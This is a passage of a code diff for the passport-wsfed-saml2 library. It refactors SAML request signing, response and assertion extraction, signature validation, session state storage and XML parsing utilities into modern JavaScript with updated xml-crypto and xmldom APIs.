'utf8';\n+\n+    this.parser = domParser;\n+  }\n+\n+  getSamlRequestParams (opts, callback) {\n+    const options = xtend(opts || {}, this.options);\n+\n+    const idpUrl = options.identityProviderUrl;\n     if (typeof idpUrl !== 'string' || !validUrl.isWebUri(idpUrl)) {\n       return callback(new Error(`Invalid identity provider URL: ${JSON.stringify(idpUrl)}`));\n     }\n \n-    var signatureAlgorithm = options.signatureAlgorithm || 'rsa-sha256';\n-    var digestAlgorithm = options.digestAlgorithm || 'sha256';\n+    const signatureAlgorithm = options.signatureAlgorithm || 'rsa-sha256';\n+    const digestAlgorithm = options.digestAlgorithm || 'sha256';\n \n-    var assert_and_destination = templates.assert_and_destination({\n+    const assert_and_destination = templates.assert_and_destination({\n       Destination: idpUrl,\n       AssertionConsumerServiceURL: options.callback\n     });\n \n-    var model = {\n+    let model = {\n       ID:               options.request_id,\n       IssueInstant:     generateInstant(),\n       Issuer:           options.realm,\n\n@@ -159,23 +170,23 @@\nSamlp.prototype = {\n       model = xtend(model, options.requestContext);\n     }\n \n-    var SAMLRequest;\n-    var rawRequest;\n+    let SAMLRequest;\n+    let rawRequest;\n \n     if (options.requestTemplate) {\n       try {\n-        rawRequest = supplant(options.requestTemplate, model)\n+        rawRequest = supplant(options.requestTemplate, model);\n       } catch (e) {\n-        return callback(new Error('Malformed template passed. Could not parse.'))\n+        return callback(new Error('Malformed template passed. Could not parse.'));\n       }\n     } else {\n       rawRequest = templates.samlrequest(model);\n     }\n \n     SAMLRequest = trimXml(rawRequest);\n \n-    var parsedUrl = url.parse(idpUrl, true);\n-    var params = {\n+    const parsedUrl = url.parse(idpUrl, true);\n+    const params = {\n       SAMLRequest: null,\n       RelayState: options.RelayState || (parsedUrl.query && parsedUrl.query.RelayState) || ''\n     };\n\n@@ -184,20 +195,23 @@\nSamlp.prototype = {\n       // HTTP-POST or HTTP-Redirect without deflate encoding\n       if (options.signingKey) {\n         // xml with embedded Signature\n-        var sig = new SignedXml(null, { signatureAlgorithm: algorithms.signature[signatureAlgorithm] });\n-        sig.addReference(\n-          \"//*[local-name(.)='AuthnRequest' and namespace-uri(.)='urn:oasis:names:tc:SAML:2.0:protocol']\",\n-          [\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\", \"http://www.w3.org/2001/10/xml-exc-c14n#\"],\n-          algorithms.digest[digestAlgorithm]);\n-\n-        sig.keyInfoProvider = {\n-          getKeyInfo: function () {\n-            return '<X509Data><X509Certificate>' + removeHeaders(options.signingKey.cert) + '</X509Certificate></X509Data>';\n-          }\n-        };\n \n-        sig.signingKey = options.signingKey.key;\n+        const sig = new xmlCrypto.SignedXml({\n+          privateKey: options.signingKey.key,\n+          signatureAlgorithm: algorithms.signature[signatureAlgorithm],\n+          canonicalizationAlgorithm: 'http://www.w3.org/2001/10/xml-exc-c14n#',\n+          getKeyInfoContent: () => {\n+            return `<X509Data><X509Certificate>${removeHeaders(options.signingKey.cert)}</X509Certificate></X509Data>`;\n+          },\n+        });\n+        sig.addReference({\n+          xpath: \"//*[local-name(.)='AuthnRequest' and namespace-uri(.)='urn:oasis:names:tc:SAML:2.0:protocol']\",\n+          transforms: ['http://www.w3.org/2000/09/xmldsig#enveloped-signature', 'http://www.w3.org/2001/10/xml-exc-c14n#'],\n+          digestAlgorithm: algorithms.digest[digestAlgorithm]\n+        });\n         try {\n+          // we are not converting SAMLRequest into a DOM before sending to xml-crypto because at the current time we allow the following test:\n+          // invalid CDATA xml that does not cause an error. This probably *should* cause an error, but it doesn't.\n           sig.computeSignature(SAMLRequest, { location: { reference: \"//*[local-name(.)='Issuer']\", action: 'after' } }); // Signature element must be located after Issuer\n         } catch (e) {\n           return callback(new Error('fail to compute signature'));\n\n@@ -212,7 +226,7 @@\nSamlp.prototype = {\n \n     // HTTP-Redirect with deflate encoding (http://docs.oasis-open.org/security/saml/v2.0/saml-bindings-2.0-os.pdf - section 3.4.4.1)\n     zlib.deflateRaw(new Buffer(SAMLRequest), function (err, buffer) {\n-      if (err) return callback(err);\n+      if (err) {return callback(err);}\n \n       params.SAMLRequest = buffer.toString('base64');\n\n@@ -236,165 +250,173 @@\nSamlp.prototype = {\n \n       callback(null, params);\n     });\n-  },\n+  }\n \n-  getSamlRequestUrl: function (opts, callback) {\n-    var options = xtend(opts || {}, this.options);\n+  getSamlRequestUrl (opts, callback) {\n+    const options = xtend(opts || {}, this.options);\n \n     this.getSamlRequestParams(options, function (err, params) {\n-      if (err) return callback(err);\n+      if (err) {return callback(err);}\n \n-      var parsedUrl = url.parse(options.identityProviderUrl, true);\n-      var samlRequestUrl = stripQueryAndFragmentFromURL(options.identityProviderUrl) + '?' + qs.encode(xtend(parsedUrl.query, params));\n+      let parsedUrl = url.parse(options.identityProviderUrl, true);\n+      let samlRequestUrl = stripQueryAndFragmentFromURL(options.identityProviderUrl) + '?' + qs.encode(xtend(parsedUrl.query, params));\n       if (parsedUrl.hash !== null) {\n         samlRequestUrl += parsedUrl.hash;\n       }\n       return callback(null, samlRequestUrl);\n     });\n-  },\n+  }\n \n-  getSamlRequestForm: function (opts, callback) {\n-    var options = xtend(opts || {}, this.options);\n+  getSamlRequestForm (opts, callback) {\n+    const options = xtend(opts || {}, this.options);\n \n     this.getSamlRequestParams(options, function (err, params) {\n-      if (err) return callback(err);\n+      if (err) {return callback(err);}\n \n       return callback(null, templates.form({\n         postUrl:      options.identityProviderUrl,\n         RelayState:   params.RelayState,\n         SAMLRequest:  params.SAMLRequest\n       }));\n     });\n-  },\n+  }\n \n-  decodeResponse: function(req) {\n-    var decoded = new Buffer(req.body['SAMLResponse'], 'base64').toString(this.default_encoding);\n+  decodeResponse (req) {\n+    let decoded = new Buffer(req.body['SAMLResponse'], 'base64').toString(this.defaultEncoding);\n \n     const encoding = utils.getEncoding(decoded);\n-    if (encoding && encodingMappings[encoding] && encodingMappings[encoding] !== this.default_encoding){\n+    if (encoding && encodingMappings[encoding] && encodingMappings[encoding] !== this.defaultEncoding){\n       // Encoding defers from the one configured, decode again with the correct value\n       decoded = new Buffer(req.body['SAMLResponse'], 'base64').toString(encodingMappings[encoding]);\n     }\n \n     return decoded;\n-  },\n-\n-  extractAssertion: function(samlpResponse, callback) {\n-    samlpResponse = utils.parseSamlResponse(samlpResponse);\n-    const saml2Namespace = 'urn:oasis:names:tc:SAML:2.0:assertion';\n-\n-    function done(err, assertion) {\n-      if (err) {\n-        return callback(err);\n-      }\n-\n-      assertion = utils.parseSamlAssertion(assertion);\n-\n-      // copy all ancestor namespaces see https://github.com/auth0/xml-crypto/blob/d36a1bc0af40a5a3eec9c0c7b6b3f87bb0a0bca1/lib/signed-xml.js#L390-L392\n-      // When we extract the assertion for later usage, this assertion wont include all name spaces. All namespaces from parents\n-      // nodes are used to calculate the digest.\n-      collectAncestorNamespaces(assertion)\n-        .filter((attr) => !assertion.getAttribute(attr.key))\n-        .forEach((attr) => assertion.setAttribute(attr.key, attr.value));\n-\n-      callback(null, assertion);\n-    }\n+  }\n \n-    var foundAssertions = xpath.select(\"//*[local-name(.)='Assertion']\", samlpResponse);\n+  // samlpResponse may be both a string or a DOM depending on the caller.\n+  // if the assertion is encrypted returns:\n+  //    Document|DOM of the embedded encrypted assertion,\n+  //    boolean saying there was decryption\n+  //    str of the original XML of the encrypted assertion\n+  // else:\n+  //    Node|DOM of the assertion included in the original XML\n+  //    boolean saying there was no decryption\n+  extractAssertion (samlpResponse, callback) {\n+    samlpResponse = utils.parseSamlResponse(samlpResponse, this.parser);\n+\n+    const foundAssertions = xpath.select(\"//*[local-name(.)='Assertion']\", samlpResponse);\n     if (foundAssertions.length > 1) {\n-      return done(new Error('A SAMLResponse can contain only one Assertion element.'));\n+      return callback(new Error('A SAMLResponse can contain only one Assertion element.'));\n     }\n \n     // After being sure no more \"Assertion\" elements are found, we extract it from the expected place\n-    var assertions = xpath.select(\"/*[local-name(.)='Response']/*[local-name(.)='Assertion' and namespace-uri(.)='\" + saml2Namespace + \"']\", samlpResponse);\n-    var token = assertions[0];\n+    const assertions = xpath.select(\"/*[local-name(.)='Response'][1]/*[local-name(.)='Assertion' and namespace-uri(.)='\" + saml2Namespace + \"']\", samlpResponse);\n+    const token = assertions[0];\n \n     if (!token) {\n       // check for encrypted assertion\n-      var encryptedAssertionPath = \"/*[local-name(.)='Response']/*[local-name(.)='EncryptedAssertion' and namespace-uri(.)='\" + saml2Namespace + \"']\";\n-      var encryptedAssertion = xpath.select(encryptedAssertionPath, samlpResponse);\n+      const encryptedAssertionPath = \"/*[local-name(.)='Response'][1]/*[local-name(.)='EncryptedAssertion' and namespace-uri(.)='\" + saml2Namespace + \"']\";\n+      const encryptedAssertion = xpath.select(encryptedAssertionPath, samlpResponse);\n       if (encryptedAssertion.length > 1) {\n-        return done(new Error('A SAMLResponse can contain only one EncryptedAssertion element.'));\n+        return callback(new Error('A SAMLResponse can contain only one EncryptedAssertion element.'));\n       }\n \n-      var encryptedToken = encryptedAssertion[0];\n+      const encryptedToken = encryptedAssertion[0];\n       if (encryptedToken) {\n-        var encryptedData = encryptedToken.getElementsByTagNameNS('http://www.w3.org/2001/04/xmlenc#', 'EncryptedData')[0];\n+        const encryptedData = encryptedToken.getElementsByTagNameNS('http://www.w3.org/2001/04/xmlenc#', 'EncryptedData')[0];\n         if (!encryptedData) {\n-          return done(new Error('EncryptedData not found.'));\n+          return callback(new Error('EncryptedData not found.'));\n         }\n \n         if (!this.options.decryptionKey) {\n-          return done(new Error('Assertion is encrypted. Please set options.decryptionKey with your decryption private key.'));\n+          return callback(new Error('Assertion is encrypted. Please set options.decryptionKey with your decryption private key.'));\n         }\n \n-        return xmlenc.decrypt(encryptedData, { \n-          key: this.options.decryptionKey, \n+        return xmlenc.decrypt(encryptedData, {\n+          key: this.options.decryptionKey,\n           autopadding: this.options.autopadding,\n           disallowDecryptionWithInsecureAlgorithm: false,\n           warnInsecureAlgorithm: false\n-        }, done);\n+        }, (err, decryptedAssertion) => {\n+          if (err) {\n+            return callback(err)\n+          }\n+          const assertion = utils.parseSamlAssertion(decryptedAssertion, this.parser);\n+          const foundAssertions = xpath.select(\"//*[local-name(.)='Assertion']\", assertion);\n+          if (foundAssertions.length > 1) {\n+            return callback(new Error('A EncryptedAssertion can contain only one Assertion element.'));\n+          }\n+          // After being sure no more \"Assertion\" elements are found, we extract it from the expected place\n+          const assertions = xpath.select(\"/*[local-name(.)='Assertion' and namespace-uri(.)='\" + saml2Namespace + \"']\", assertion);\n+          // if there are 0 matches, let the caller handle it\n+          return callback(null, assertions[0], true, decryptedAssertion);\n+        });\n       }\n     }\n \n-    done(null, token);\n-  },\n+    callback(null, token, false);\n+  }\n \n-  getSamlStatus: function (samlResponse) {\n-    var status = {};\n+  getSamlStatus (samlResponse) {\n+    let status = {};\n \n-    samlResponse = utils.parseSamlResponse(samlResponse);\n+    samlResponse = utils.parseSamlResponse(samlResponse, this.parser);\n \n     // status code\n-    var statusCodeXml = xpath.select(\"//*[local-name(.)='Status']/*[local-name(.)='StatusCode']\", samlResponse)[0];\n+    const statusCodeXml = xpath.select(\"/*[local-name(.)='Response'][1]/*[local-name(.)='Status']/*[local-name(.)='StatusCode']\", samlResponse)[0];\n     if (statusCodeXml) {\n       status.code = statusCodeXml.getAttribute('Value');\n       // status sub code\n-      var statusSubCodeXml = xpath.select(\"//*[local-name(.)='Status']/*[local-name(.)='StatusCode']/*[local-name(.)='StatusCode']\", samlResponse)[0];\n+      const statusSubCodeXml = xpath.select(\"/*[local-name(.)='Response'][1]/*[local-name(.)='Status']/*[local-name(.)='StatusCode']/*[local-name(.)='StatusCode']\", samlResponse)[0];\n       if (statusSubCodeXml) {\n         status.subCode = statusSubCodeXml.getAttribute('Value');\n       }\n     }\n \n     // status message\n-    var samlStatusMsgXml = xpath.select(\"//*[local-name(.)='Status']/*[local-name(.)='StatusMessage']\", samlResponse)[0];\n+    const samlStatusMsgXml = xpath.select(\"/*[local-name(.)='Response'][1]/*[local-name(.)='Status']/*[local-name(.)='StatusMessage']\", samlResponse)[0];\n     if (samlStatusMsgXml) {\n       status.message = samlStatusMsgXml.textContent;\n     }\n \n     // status detail\n-    var samlStatusDetailXml = xpath.select(\"//*[local-name(.)='Status']/*[local-name(.)='StatusDetail']\", samlResponse)[0];\n+    const samlStatusDetailXml = xpath.select(\"/*[local-name(.)='Response'][1]/*[local-name(.)='Status']/*[local-name(.)='StatusDetail']\", samlResponse)[0];\n     if (samlStatusDetailXml) {\n       status.detail = samlStatusDetailXml.textContent;\n     }\n \n     return status;\n-  },\n-\n-  validateSamlResponse: function (samlResponse, callback) {\n-    var self = this;\n+  }\n \n-    samlResponse = utils.parseSamlResponse(samlResponse);\n+  validateSamlResponse (samlResponseStr, meta, callback) {\n+    if (typeof samlResponseStr !== 'string') {\n+      throw new Error('samlResponse must be a string');\n+    }\n+    const samlResponse = utils.parseSamlResponse(samlResponseStr, this.parser);\n \n-    // Check that the saml Resopnse actually has a Response object\n-    var responseXMLs = xpath.select(\"//*[local-name(.)='Response']\", samlResponse);\n+    // Check that the saml Response actually has a Response object\n+    const responseXMLs = xpath.select(\"//*[local-name(.)='Response']\", samlResponse);\n     if (responseXMLs.length === 0) {\n       return callback(new Error('XML is not a valid saml response'));\n     }\n     if (responseXMLs.length > 1) {\n       return callback(new Error('SAMLResponse should be unique'));\n     }\n-    var responseXML = responseXMLs[0];\n+    const responseXML = responseXMLs[0];\n \n-    self.isValidResponseID(responseXML.getAttribute('ID'), function(err){\n-      if (err && self.options.checkResponseID) { return callback(err); }\n+    this.isValidResponseID(responseXML.getAttribute('ID'), (err) => {\n+      if (err && this.options.checkResponseID) {\n+        return callback(err);\n+      }\n \n-      var inResponseTo = responseXML.getAttribute('InResponseTo');\n+      const inResponseTo = responseXML.getAttribute('InResponseTo');\n \n-      self.isValidInResponseTo(inResponseTo, function(err){\n-        if (err && self.options.checkInResponseTo) { return callback(err); }\n+      this.isValidInResponseTo(inResponseTo, (err) => {\n+        if (err && this.options.checkInResponseTo) {\n+          return callback(err);\n+        }\n \n-        var destination = responseXML.getAttribute('Destination');\n+        const destination = responseXML.getAttribute('Destination');\n \n         // https://www.oasis-open.org/committees/download.php/35711/sstc-saml-core-errata-2.0-wd-06-diff.pdf\n         // Page 36 of 91\n\n@@ -404,42 +426,46 @@\nSamlp.prototype = {\n         // protocol bindings. If it is present, the actual recipient MUST check that the URI reference identifies the\n         // location at which the message was received. If it does not, the request MUST be discarded. Some\n         // protocol bindings may require the use of this attribute (see [SAMLBind]).\n-        if (destination && destination !== self.options.destinationUrl){\n-          self.eventEmitter.emit('destinationValidationFailed', {\n-            configuredDestination: self.options.destinationUrl,\n+        if (destination && destination !== this.options.destinationUrl) {\n+          this.eventEmitter.emit('destinationValidationFailed', {\n+            configuredDestination: this.options.destinationUrl,\n             assertionDestination: destination\n           });\n \n-          if (self.options.checkDestination){\n-            return callback(new Error('Destination endpoint ' + destination + ' did not match ' + self.options.destinationUrl));\n+          if (this.options.checkDestination) {\n+            return callback(new Error('Destination endpoint ' + destination + ' did not match ' + this.options.destinationUrl));\n           }\n         }\n \n         // check status\n-        var samlStatus = self.getSamlStatus(samlResponse);\n+        const samlStatus = this.getSamlStatus(responseXML);\n \n         // Check if this is a known error\n-        var errorMessage = ErrorMessages[samlStatus.subCode] ||\n-                          ErrorMessages[samlStatus.code];\n+        const errorMessage = ErrorMessages[samlStatus.subCode] ||\n+            ErrorMessages[samlStatus.code];\n \n         if (errorMessage) {\n           // Return auth failed with the actual message or a friendly message\n           return callback (new AuthenticationFailedError(samlStatus.message || errorMessage, samlStatus.detail));\n         }\n \n         // extract assertion\n-        self.extractAssertion(samlResponse, function (err, assertion) {\n+        this.extractAssertion(responseXML, (err, assertionDom, encrypted, assertionStr) => {\n           if (err) { return callback(err); }\n-          if (!assertion) {\n+          if (!assertionDom) {\n             return callback(new Error('saml response does not contain an Assertion element (Status: ' + samlStatus.code + ')'));\n           }\n \n-          var samlResponseSignaturePath = \"/*[local-name(.)='Response']/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\";\n-          var isResponseSigned = xpath.select(samlResponseSignaturePath, samlResponse).length > 0;\n-          var samlAssertionSignaturePath = \".//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\";\n-          var isAssertionSigned =  xpath.select(samlAssertionSignaturePath, assertion).length > 0;\n+          const samlResponseSignaturePath = \"/*[local-name(.)='Response'][1]/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\";\n+          const isResponseSigned = xpath.select(samlResponseSignaturePath, responseXML).length > 0;\n \n-          self.eventEmitter.emit('SAMLResponse:signatures', {\n+          const samlAssertionSignaturePath = encrypted ?\n+              \"/*[local-name(.)='Assertion'][1]/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\" :\n+              \"/*[local-name(.)='Response'][1]/*[local-name(.)='Assertion'][1]/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\";\n+\n+          const isAssertionSigned =  xpath.select(samlAssertionSignaturePath, assertionDom).length > 0;\n+\n+          this.eventEmitter.emit('SAMLResponse:signatures', {\n             isResponseSigned: isResponseSigned,\n             isAssertionSigned: isAssertionSigned\n           });\n\n@@ -448,63 +474,60 @@\nSamlp.prototype = {\n             return callback(new Error('neither the response nor the assertion are signed'));\n           }\n \n-         if (isAssertionSigned) {\n-            var assertionSignature = xpath.select(samlAssertionSignaturePath, assertion)[0];\n-            if (assertionSignature.prefix) {\n-              try {\n-                var dsigNamespace = assertionSignature.lookupNamespaceURI(assertionSignature.prefix);\n-                if (dsigNamespace && !assertionSignature.getAttribute('xmlns:' + assertionSignature.prefix)) {\n-                  // saml assertion signature has a prefix but namespace is defined on parent, copy it to assertion\n-                  assertionSignature.setAttribute('xmlns:' + assertionSignature.prefix, dsigNamespace);\n-                }\n-              } catch(e) {}\n-            }\n+          if (isAssertionSigned) {\n+            const assertionSignature = xpath.select(samlAssertionSignaturePath, assertionDom)[0];\n \n-            // If we find that a namespace was defined in resopnse and is used in assertion, we copy it to the assertion element\n+            // If we find that a namespace was defined in response and is used in assertion, we copy it to the assertion element\n             if (responseXML.attributes) {\n-              var length = responseXML.attributes.length;\n-              for (var i = 0; i < length; ++i) {\n-                var attr = responseXML.attributes[i];\n-                // If attribute is a namespace, and is the signature prefix and is used in Assertion, cpy it to assertion\n-                if (attr.name.indexOf(\"xmlns\") === 0 &&\n-                  attr.name.indexOf('xmlns:' + assertionSignature.prefix) === -1 &&\n-                  xpath.select(\"//*[local-name(.)='Assertion']//*[namespace-uri(.)='\" + attr.value + \"'] or //*[local-name(.)='Assertion']//@*[namespace-uri(.)='\" + attr.value + \"']\", samlResponse)) {\n-                  assertion.setAttribute(attr.name, attr.value);\n+              const length = responseXML.attributes.length;\n+              for (let i = 0; i < length; ++i) {\n+                const attr = responseXML.attributes[i];\n+                // If attribute is a namespace, and is the signature prefix and is used in Assertion, copy it to assertion\n+                // Don't set attributes that already exist (xmldom may copy them depending on the version)\n+                if (!assertionDom.getAttribute(attr.name)) {\n+                  continue\n+                }\n+                const select = encrypted ?\n+                    \"/*[local-name(.)='Assertion'][1]//*[namespace-uri(.)='\" + attr.value + \"'] or /*[local-name(.)='Assertion'][1]//@*[namespace-uri(.)='\" + attr.value + \"']\" :\n+                    \"/*[local-name(.)='Response'][1]/*[local-name(.)='Assertion'][1]//*[namespace-uri(.)='\" + attr.value + \"'] or /*[local-name(.)='Response'][1]/*[local-name(.)='Assertion'][1]//@*[namespace-uri(.)='\" + attr.value + \"']\";\n+                if (attr.name.indexOf('xmlns') === 0 &&\n+                    attr.name.indexOf('xmlns:' + assertionSignature.prefix) === -1 &&\n+                    xpath.select(select, responseXML)) {\n+                  assertionDom.setAttribute(attr.name, attr.value);\n                 }\n               }\n             }\n           }\n \n           if (isResponseSigned) {\n-            self._saml.validateSignature(samlResponse, {\n-              cert: self.options.cert,\n-              thumbprints: self.options.thumbprints,\n+            this._saml.validateSignature(samlResponseStr, {\n+              meta: meta,\n               signaturePath: samlResponseSignaturePath\n-            },\n-            function (err) {\n+            }, (err, signed) => {\n               if (err) { return callback(err); }\n \n-              if (!isAssertionSigned) {\n-                return self._saml.parseAssertion(assertion, callback);\n-              }\n-\n-              return self._saml.validateSamlAssertion(assertion, callback);\n+              this.extractAssertion(signed,  (err, assertion) => {\n+                if (err) {\n+                  // shouldn't happen\n+                  return callback(err);\n+                }\n+                if (!assertion) {\n+                  return callback(new Error('saml response does not contain an Assertion element (Status: ' + samlStatus.code + ')'));\n+                }\n+                // no need to validate the assertion once again due:\n+                // In parseAssertion, it decrypts the EncryptedAssertion from solely the signed string. Since the encrypted cipher text is signed via the response element, i.e. a subset, it's integrity is also protected.\n+                //Even if the underlying Encrypted Assertion post-decryption has a Signature, we don't need to verify it, because the cipher text was already protected\n+                return this._saml.parseAssertion(assertion, callback);\n+              });\n             });\n           }\n           else if (isAssertionSigned) {\n-            return self._saml.validateSamlAssertion(assertion, callback);\n+            return this._saml.validateSamlAssertion(assertionStr || samlResponseStr, { meta }, callback);\n           }\n         });\n       });\n     });\n   }\n-};\n-\n-function generateInstant() {\n-  var date = new Date();\n-  return date.getUTCFullYear() + '-' + ('0' + (date.getUTCMonth()+1)).slice(-2) + '-' + ('0' + date.getUTCDate()).slice(-2) + 'T' + ('0' + date.getUTCHours()).slice(-2) + \":\" + ('0' + date.getUTCMinutes()).slice(-2) + \":\" + ('0' + date.getUTCSeconds()).slice(-2) + \"Z\";\n }\n \n-function stripQueryAndFragmentFromURL(url) {\n-  return url.split(\"#\")[0].split(\"?\")[0];\n-}\n+module.exports = Samlp;\n\\ No newline at end of file\n```\n\nFilename: lib/passport-wsfed-saml2/state/session.js:\n```\n@@ -1,4 +1,4 @@\n-var uid = require('uid2');\n+const uid = require('uid2');\n \n /**\n  * Creates an instance of `SessionStore`.\n\n@@ -38,11 +38,15 @@\nfunction SessionStore(options) {\n SessionStore.prototype.store = function(req, callback) {\n   if (!req.session) { return callback(new Error('Authentication requires session support when using state. Did you forget to use express-session middleware?')); }\n \n-  var key = this._key;\n-  var state = uid(24);\n-  if (!req.session[key]) { req.session[key] = {}; }\n-  req.session[key].state = state;\n-  callback(null, state);\n+  const key = this._key;\n+  uid(24, (err, state) => {\n+    if (err) {\n+      return callback(err);\n+    }\n+    if (!req.session[key]) { req.session[key] = {}; }\n+    req.session[key].state = state;\n+    callback(null, state);\n+  });\n };\n \n /**\n\n@@ -59,12 +63,12 @@\nSessionStore.prototype.store = function(req, callback) {\n SessionStore.prototype.verify = function(req, providedState, callback) {\n   if (!req.session) { return callback(new Error('Authentication requires session support when using state. Did you forget to use express-session middleware?')); }\n \n-  var key = this._key;\n+  const key = this._key;\n   if (!req.session[key]) {\n     return callback(null, false, { message: 'Unable to verify authorization request state.' });\n   }\n \n-  var state = req.session[key].state;\n+  const state = req.session[key].state;\n   if (!state) {\n     return callback(null, false, { message: 'Unable to verify authorization request state.' });\n   }\n\n@@ -82,4 +86,4 @@\nSessionStore.prototype.verify = function(req, providedState, callback) {\n };\n \n // Expose constructor.\n-module.exports = SessionStore;\n+module.exports = SessionStore;\n\\ No newline at end of file\n```\n\nFilename: lib/passport-wsfed-saml2/strategy.js:\n```\n@@ -1,17 +1,15 @@\n-var util      = require('util');\n-var url       = require('url');\n-var jwt       = require('jsonwebtoken');\n-var Strategy  = require('passport-strategy');\n-var saml      = require('./saml');\n-var wsfed     = require('./wsfederation');\n-var samlp     = require('./samlp');\n-var getReqUrl = require('./utils').getReqUrl;\n-var EventEmitter = require('events');\n-var utils     = require('./utils');\n-\n-var utils             = require('./utils');\n-var NullStateStore    = require('./state/null');\n-var SessionStateStore = require('./state/session');\n+const util      = require('util');\n+const url       = require('url');\n+const jwt       = require('jsonwebtoken');\n+const Strategy  = require('passport-strategy');\n+const saml      = require('./saml');\n+const wsfed     = require('./wsfederation');\n+const samlp     = require('./samlp');\n+const getReqUrl = require('./utils').getReqUrl;\n+const EventEmitter = require('events');\n+const utils             = require('./utils');\n+const NullStateStore    = require('./state/null');\n+const SessionStateStore = require('./state/session');\n \n function WsFedSaml2Strategy (options, verify) {\n   if (typeof options === 'function') {\n\n@@ -36,7 +34,7 @@\nfunction WsFedSaml2Strategy (options, verify) {\n \n   if (!this.options.jwt) {\n     this._saml = new saml.SAML(this.options);\n-    this._samlp =  new samlp(this.options, this._saml);\n+    this._samlp = new samlp(this.options, this._saml);\n   } else {\n     this._jwt = this.options.jwt;\n   }\n\n@@ -63,12 +61,12 @@\nutil.inherits(WsFedSaml2Strategy, Strategy);\n WsFedSaml2Strategy.prototype._authenticate_saml = function (req, state) {\n   var self = this;\n \n-  self._wsfed.retrieveToken(req, function(err, token) {\n+  self._wsfed.retrieveToken(req, function(err, wResult) {\n     if (err) return self.fail(err, err.status || 400);\n \n     self.options.recipientUrl = self.options.recipientUrl || getReqUrl(req);\n \n-    self._saml.validateSamlAssertion(token, function (err, profile) {\n+    self._saml.validateSamlAssertion(wResult, { meta: { req } }, function (err, profile) {\n       if (err) {\n         return self.error(err);\n       }\n\n@@ -94,7 +92,6 @@\nWsFedSaml2Strategy.prototype._authenticate_saml = function (req, state) {\n       }\n     })\n   });\n-\n };\n \n WsFedSaml2Strategy.prototype._authenticate_jwt = function (req, state) {\n\n@@ -213,15 +210,13 @@\nWsFedSaml2Strategy.prototype.authenticate = function (req, opts) {\n           return self.fail('SAMLResponse should be a valid xml', 400);\n         }\n \n-        var samlResponseDom = utils.parseSamlResponse(samlResponse);\n-\n         // If options are not set, we set the expected value from the request object\n         var req_full_url = getReqUrl(req);\n         self.options.destinationUrl = self.options.destinationUrl || req_full_url;\n         self.options.recipientUrl = self.options.recipientUrl || req_full_url;\n \n \n-        self._samlp.validateSamlResponse(samlResponseDom, function (err, profile) {\n+        self._samlp.validateSamlResponse(samlResponse, { meta: { req } }, function (err, profile) {\n           if (err) return self.fail(err, err.status || 400);\n \n           var verified = function (err, user, info) {\n\n@@ -282,19 +277,19 @@\nWsFedSaml2Strategy.prototype.authenticate = function (req, opts) {\n   }\n \n   switch (protocol) {\n-  case 'wsfed':\n-    executeWsfed(req, this.options);\n-    break;\n-  case 'samlp':\n-    executeSamlp(req, this.options);\n-    break;\n-  default:\n-    throw new Error('not supported protocol: ' + protocol);\n+    case 'wsfed':\n+      executeWsfed(req, this.options);\n+      break;\n+    case 'samlp':\n+      executeSamlp(req, this.options);\n+      break;\n+    default:\n+      throw new Error('not supported protocol: ' + protocol);\n   }\n };\n \n WsFedSaml2Strategy.prototype.authorizationParams = function(options) {\n   return options;\n };\n \n-module.exports = WsFedSaml2Strategy;\n+module.exports = WsFedSaml2Strategy;\n\\ No newline at end of file\n```\n\nFilename: lib/passport-wsfed-saml2/utils.js:\n```\n@@ -1,20 +1,29 @@\n-var xmldom = require('@auth0/xmldom');\n-var crypto = require('crypto');\n+const xmldom = require('@xmldom/xmldom');\n \n-var SamlAssertionParserError = require('./errors/SamlAssertionParserError');\n-var SamlResponseParserError = require('./errors/SamlResponseParserError');\n-var WSFederationResultParserError = require('./errors/WSFederationResultParserError');\n+const crypto = require('crypto');\n \n-const CERT_START = \"-----BEGIN CERTIFICATE-----\\n\";\n-const CERT_END = \"\\n-----END CERTIFICATE-----\\n\";\n+const SamlAssertionParserError = require('./errors/SamlAssertionParserError');\n+const SamlResponseParserError = require('./errors/SamlResponseParserError');\n+const SamlRequestParserError = require('./errors/SamlRequestParserError');\n+const WSFederationResultParserError = require('./errors/WSFederationResultParserError');\n+\n+const CERT_START = '-----BEGIN CERTIFICATE-----\\n';\n+const CERT_END = '\\n-----END CERTIFICATE-----\\n';\n \n exports.certToPEM = (cert) => CERT_START + cert.match(/.{1,64}/g).join('\\n') + CERT_END;\n \n // convert from \\r\\n -> \\n this should be done by the xml parser, but is ignoring this.\n-function crlf2lf(string) {\n+exports.crlf2lf = function crlf2lf(string) {\n   return string.replace(/\\r\\n?/g, '\\n');\n }\n \n+exports.parseXmlString = function(xml, parser = new xmldom.DOMParser()) {\n+  const normalizedString = exports.crlf2lf(xml);\n+  // to avoid a breaking change for customers, return the original result.\n+  return parser.parseFromString(normalizedString, 'text/xml');\n+}\n+\n+\n exports.getSamlAssertionVersion = function(samlAssertion){\n   if (samlAssertion.getAttribute('MajorVersion') === '1') {\n     return '1.1';\n\n@@ -24,13 +33,13 @@\nexports.getSamlAssertionVersion = function(samlAssertion){\n     // In this case the version is undefined, or we weren't able to determine it.\n     return undefined;\n   }\n-\n };\n \n-exports.parseSamlAssertion = function(xml) {\n+\n+exports.parseSamlAssertion = function(xml, parser) {\n   if (typeof xml === 'string') {\n     try {\n-      return new xmldom.DOMParser().parseFromString(crlf2lf(xml));\n+      return exports.parseXmlString(xml, parser);\n     } catch (e) {\n       throw new SamlAssertionParserError('SAML Assertion should be a valid xml', e);\n     }\n\n@@ -39,10 +48,10 @@\nexports.parseSamlAssertion = function(xml) {\n   return xml;\n };\n \n-exports.parseSamlResponse = function(xml) {\n+exports.parseSamlResponse = function(xml, parser) {\n   if (typeof xml === 'string') {\n     try {\n-      return new xmldom.DOMParser().parseFromString(crlf2lf(xml));\n+      return exports.parseXmlString(xml, parser);\n     } catch (e) {\n       throw new SamlResponseParserError('SAMLResponse should be a valid xml', e);\n     }\n\n@@ -51,10 +60,23 @@\nexports.parseSamlResponse = function(xml) {\n   return xml;\n };\n \n-exports.parseWsFedResponse = function(xml) {\n+\n+exports.parseSamlRequest = function(xml, parser) {\n   if (typeof xml === 'string') {\n     try {\n-      return new xmldom.DOMParser().parseFromString(crlf2lf(xml));\n+      return 